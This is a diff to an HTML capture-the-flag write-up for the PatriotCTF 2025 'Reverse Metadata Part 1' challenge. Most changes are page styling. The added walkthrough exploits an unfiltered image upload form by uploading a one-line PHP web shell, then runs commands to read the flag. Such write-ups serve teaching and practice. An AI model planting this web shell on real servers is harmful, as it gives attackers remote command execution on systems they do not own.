@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Reverse Metadata Part 1 • PatriotCTF 2025</title>
 
-  <!-- GLOBAL THEME PERSISTENCE -->
+  <!-- GLOBAL THEME PERSISTENCE (add this to every page) -->
   <script>
     if (localStorage.theme === "light" || (!localStorage.theme && window.matchMedia("(prefers-color-scheme: light)").matches)) {
       document.documentElement.classList.add("light");
@@ -48,8 +48,16 @@
       -webkit-text-fill-color: transparent;
       margin: 0;
     }
+    .title small { display: block; text-align: center; font-size: 2rem; color: #8b949e; margin-top: 12px; }
+    .light .title small { color: #57606a; }
 
-    /* IMAGES: SAME SIZE, NO CROPPING, PERFECT FIT */
+    .meta { text-align: center; margin: 30px 0 50px; color: #8b949e; font-size: 1.1rem; }
+    .light .meta { color: #57606a; }
+
+    h2 { color: #58a6ff; font-size: 2.4rem; margin: 70px 0 25px; padding-bottom: 12px; border-bottom: 3px solid #58a6ff; }
+    .light h2 { color: #1f6feb; border-bottom-color: #1f6feb; }
+
+    /* IMAGES: SAME SIZE, NO CROPPING */
     .image-grid {
       display: grid;
       grid-template-columns: repeat(auto-fit, minmax(480px, 1fr));
@@ -68,9 +76,10 @@
     .light .image-item { background: white; }
 
     .image-item img {
+      max-width: 100%;
       width: 100%;
       height: 320px;
-      object-fit: contain;     /* ← NO CROPPING */
+      object-fit: contain;
       background: #0d1117;
       padding: 20px;
       box-sizing: border-box;
@@ -86,8 +95,15 @@
     }
     .light .image-item p { background: #f6f8fa; }
 
-    h2 { color: #58a6ff; border-bottom: 3px solid #58a6ff; padding-bottom: 12px; margin: 70px 0 25px; }
-    .light h2 { color: #1f6feb; border-color: #1f6feb; }
+    pre {
+      background: #010409 !important;
+      padding: 22px !important;
+      border-radius: 18px;
+      border: 2px solid #30363d;
+      margin: 40px 0;
+      font-size: 1.1rem;
+    }
+    .light pre { background: #f6f8fa !important; color: #24292f !important; border-color: #d0d7de; }
 
     .flag-box {
       background: rgba(59,249,80,0.15);
@@ -98,7 +114,12 @@
       margin: 70px 0;
       box-shadow: 0 0 60px rgba(59,249,80,0.3);
     }
-    .flag { font-size: 2.4rem; color: #3fb950; text-shadow: 0 0 30px #3fb950; }
+    .flag { font-size: 2.4rem; font-weight: bold; color: #3fb950; text-shadow: 0 0 30px #3fb950; letter-spacing: 2px; font-family: 'Roboto Mono', monospace; }
+
+    .footer-note { text-align: center; margin-top: 120px; color: #8b949e; font-size: 0.95rem; }
+    .footer-note a { color: #58a6ff; text-decoration: none; }
+    .footer-note a:hover { text-decoration: underline; }
+    .light .footer-note a { color: #1f6feb; }
 
     @media (max-width: 768px) {
       .writeup { margin: 20px; padding: 40px; }
@@ -111,7 +132,7 @@
 </head>
 <body>
 
-  <a href="../../index.html" class="back-btn">Back</a>
+  <a href="../" class="back-btn">Back</a>
 
   <div class="writeup">
     <div class="title">
@@ -121,7 +142,7 @@
     <div class="meta">PatriotCTF 2025 • Solved November 23, 2025</div>
 
     <h2>1. The Upload Form</h2>
-    <p>Simple file upload page — no client-side filtering in the source code.</p>
+    <p>We are greeted by a very simple image upload page with absolutely no client-side filtering visible in the source code.</p>
 
     <div class="image-grid">
       <div class="image-item">
@@ -130,11 +151,47 @@
       </div>
       <div class="image-item">
         <img src="https://github.com/user-attachments/assets/93d98d98-ce2e-4462-997c-0c46931c5812" alt="Source code">
-        <p>Source code — no filtering</p>
+        <p>Source code — no extension checks</p>
       </div>
     </div>
 
-    <!-- Repeat for other sections -->
+    <h2>2. Uploading a PHP Shell</h2>
+    <p>Since there’s no filtering, we upload a classic one-liner PHP web shell (<code>&lt;?php system($_GET['cmd']); ?&gt;</code>) as <code>syndro.php</code>.  
+    The server replies “Upload successful!” → we guess the path <code>/uploads/syndro.php</code> and get instant RCE.</p>
+
+    <div class="image-grid">
+      <div class="image-item">
+        <img src="https://github.com/user-attachments/assets/eec01e40-edc0-469a-9e37-1f85669bfddf" alt="Upload success">
+        <p>Upload successful message</p>
+      </div>
+      <div class="image-item">
+        <img src="https://github.com/user-attachments/assets/7f667e88-f38f-4b7d-89da-d662e96c6e80" alt="Shell execution">
+        <p>SYNDRO shell executing commands</p>
+      </div>
+    </div>
+
+    <h2>3. Finding the Flag</h2>
+    <p>With the shell we simply list the directory and read the flag file:</p>
+    <pre><code>ls -la
+cat flag2.txt</code></pre>
+
+    <div class="flag-box">
+      <div class="flag">MASONCC{images_****}</div>
+    </div>
+
+    <div class="image-grid">
+      <div class="image-item">
+        <img src="https://github.com/user-attachments/assets/c50c112b-3a8a-4fc3-bbb7-42715a07d8d6" alt="Flag captured">
+        <p>Flag captured</p>
+      </div>
+    </div>
+
+    <div class="footer-note">
+      Writeup by Syndro • 
+      <a href="https://github.com/syndro-1">GitHub</a> • 
+      <a href="https://syndro-1.github.io/syndro/">All writeups</a>
+    </div>
   </div>
+
 </body>
 </html>
